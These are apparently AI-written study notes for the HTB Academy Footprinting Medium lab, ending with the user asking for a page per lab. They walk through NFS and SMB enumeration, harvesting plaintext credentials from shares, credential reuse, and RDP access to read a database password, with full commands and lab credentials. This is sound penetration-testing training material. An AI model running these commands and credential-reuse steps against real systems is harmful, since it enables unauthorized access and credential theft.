Here’s a study-notes version you can keep.
HTB Academy Footprinting Lab — Medium: what worked
Goal
Recover the password for the user HTB by enumerating the target, abusing exposed services, and pivoting from one credential to the next. The writeup’s intended path is: enumerate open ports, mount the NFS share, recover alex’s credentials, use them over SMB to find MSSQL creds, RDP in as alex, then use SQL locally to browse the database and read the HTB password from the Accounts.dbo.devsacc table. ([Medium](https://babatundeojo.medium.com/htb-academy-footprinting-lab-medium-9ec0eb8e0e89))
1) Port scan identified the attack surface
A full TCP scan showed the important services: 111, 135, 139, 445, 2049, 3389, and 5985, which pointed to NFS, SMB, RDP, and WinRM. That matches the writeup’s enumeration stage. ([Medium](https://babatundeojo.medium.com/htb-academy-footprinting-lab-medium-9ec0eb8e0e89))
Commands used:

nmap -p- --min-rate 2000 -T4 <target>
nmap -sV -sC -p 111,135,139,445,2049,3389,5985 <target>
showmount -e <target>
rpcinfo -p <target>

2) NFS was the first successful foothold
The target exported /TechSupport, and mounting it exposed lots of ticket files. Almost all were empty; one non-empty ticket contained credentials for alex. This is exactly the pivot described in the writeup. ([Medium](https://babatundeojo.medium.com/htb-academy-footprinting-lab-medium-9ec0eb8e0e89))
Commands used:

showmount -e <target>
mkdir -p ~/target-nfs
sudo mount -t nfs <target>:/TechSupport ~/target-nfs
cd ~/target-nfs/TechSupport
sha1sum *.txt | sort | awk '{print $1}' | uniq -c
cat ticket4238791283782.txt

Credential recovered:

alex : lol123!mD

3) SMB with alex worked
Using alex’s credentials against SMB succeeded and exposed useful shares, especially devshare and Users. The writeup also uses smbmap and smbclient at this stage. ([Medium](https://babatundeojo.medium.com/htb-academy-footprinting-lab-medium-9ec0eb8e0e89))
Commands used:

crackmapexec smb <target> -u alex -p 'lol123!mD'
smbclient -L //<target> -U alex%'lol123!mD'
smbmap -H <target> -u alex -p 'lol123!mD'
smbmap -H <target> -u alex -p 'lol123!mD' -R Users

4) devshare leaked MSSQL credentials
Inside devshare, the file important.txt contained another credential pair:

sa:87N1ns@slls83

The writeup explicitly says this file contains MSSQL credentials. ([Medium](https://babatundeojo.medium.com/htb-academy-footprinting-lab-medium-9ec0eb8e0e89))
Commands used:

mkdir -p /tmp/smbloot
smbclient //<target>/devshare -U alex%'lol123!mD'
# inside smbclient:
lcd /tmp/smbloot
ls
get important.txt
exit

cat /tmp/smbloot/important.txt

Saved file location:

/tmp/smbloot/important.txt

5) Remote MSSQL was a dead end
Trying to use MSSQL remotely did not work because 1433/1434 were closed. That explains why mssqlclient.py failed from your box. The writeup’s intended route is not remote SQL; it is to log in with RDP and use SQL locally on the host. ([Medium](https://babatundeojo.medium.com/htb-academy-footprinting-lab-medium-9ec0eb8e0e89))
Commands used:

nmap -Pn -sV -p 1433,1434 <target>
mssqlclient.py sa:'87N1ns@slls83'@<target>

What this taught:
• sa:87N1ns@slls83 was real.
• SQL Server was not exposed remotely.
• The next step had to be local access via RDP. ([Medium](https://babatundeojo.medium.com/htb-academy-footprinting-lab-medium-9ec0eb8e0e89))
6) RDP with alex was the intended pivot
The correct move after getting alex and sa creds was to RDP into the Windows machine as alex, then open SQL Server Management Studio locally. The writeup uses xfreerdp3 /u:alex /p:'lol123!mD' /v:<target> for this exact step. ([Medium](https://babatundeojo.medium.com/htb-academy-footprinting-lab-medium-9ec0eb8e0e89))
Command used:

xfreerdp /u:alex /p:'lol123!mD' /v:<target> /clipboard /cert:ignore

Mac note:
• Clipboard issues are common; /clipboard helps.
• Typing @ may require Option+2, Shift+2, or using osk inside the RDP session.
7) SQL clues in Alex’s profile confirmed the local SQL path
You also found strong supporting evidence in Alex’s user profile:
• SQL Server Management Studio shortcut on the Desktop
• SSMS config files like RegSrvr.xml and UserSettings.xml
• RegSrvr.xml referenced WINMEDIUM with integrated security=True
• UserSettings.xml showed SQL-related settings and the login name sa
Those findings reinforced that SQL was meant to be accessed from inside the machine, not remotely. The writeup’s final database path is to expand Databases -> Accounts -> Tables -> dbo.devsacc and inspect rows for the HTB user. ([Medium](https://babatundeojo.medium.com/htb-academy-footprinting-lab-medium-9ec0eb8e0e89))
Useful SMB collection commands:

mkdir -p /tmp/sqlloot
smbclient //<target>/Users -U alex%'lol123!mD'
# inside smbclient:
lcd /tmp/sqlloot
cd alex\AppData\Roaming\Microsoft\SQL Server Management Studio
get RegSrvr.xml
get UserSettings.xml
exit

8) What worked vs what was extra
What worked:
• NFS enumeration
• mounting /TechSupport
• finding alex : lol123!mD
• SMB auth with alex
• finding important.txt
• recovering sa : 87N1ns@slls83
• realizing SQL was local-only
• RDP to the target as alex
• using SQL Server Management Studio locally to query the database for HTB’s password. ([Medium](https://babatundeojo.medium.com/htb-academy-footprinting-lab-medium-9ec0eb8e0e89))
What was extra and not necessary for the intended path:
• offline DPAPI decryption
• Firefox profile hunting
• PowerShell history
• trying to use sa remotely over TCP when MSSQL ports were closed
Those were useful explorations, but the writeup’s intended solution did not require them. ([Medium](https://babatundeojo.medium.com/htb-academy-footprinting-lab-medium-9ec0eb8e0e89))
Short version for your notes

1. Scan target -> found NFS, SMB, RDP, WinRM.
2. showmount -e -> /TechSupport export.
3. Mount NFS -> inspect tickets.
4. Only one non-empty ticket -> recover alex:lol123!mD.
5. Use alex on SMB -> enumerate shares.
6. devshare/important.txt -> recover sa:87N1ns@slls83.
7. MSSQL remote ports closed -> SQL is local only.
8. RDP in as alex.
9. Open SQL Server Management Studio locally.
10. Browse Databases -> Accounts -> Tables -> dbo.devsacc.
11. Read the row for user HTB and copy the password.

Commands worth memorizing

showmount -e <target>
sudo mount -t nfs <target>:/TechSupport ~/target-nfs
sha1sum *.txt | sort | awk '{print $1}' | uniq -c
crackmapexec smb <target> -u alex -p 'lol123!mD'
smbclient -L //<target> -U alex%'lol123!mD'
xfreerdp /u:alex /p:'lol123!mD' /v:<target> /clipboard /cert:ignore

Key lesson
When you find:
• working SMB creds for a desktop user,
• an important.txt with sa credentials,
• SQL Server Management Studio artifacts on the user profile,
• and remote MSSQL is closed,
the right conclusion is: RDP into the box and use SQL locally. That is the core lesson of this lab. ([Medium](https://babatundeojo.medium.com/htb-academy-footprinting-lab-medium-9ec0eb8e0e89))
If you want, I can turn this into a one-page cheat sheet format. add this to the medium lab of foot printing, i want you to create a special page for each of the labsbecause i HAVE A LOT OF THEM HERE